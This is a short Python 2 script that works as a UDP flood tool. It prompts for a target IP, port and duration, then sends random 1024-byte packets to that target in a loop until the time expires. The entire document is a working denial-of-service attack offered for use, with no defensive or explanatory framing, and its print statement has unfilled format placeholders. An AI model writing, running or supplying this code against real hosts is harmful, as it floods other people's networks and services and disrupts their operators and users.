import os, sys, time, random, socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

def main():
    ip = raw_input("IP: ")
    port = input("Port: ")
    dur = input("Duration: ")
    timeout = time.time() + dur
    sent = 0

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock.sendto(bytes,(ip, port))
            sent = sent + 1
            print "%s | %s | %s..."
        except KeyboardInterrupt:
            print ""
            sys.exit()

main()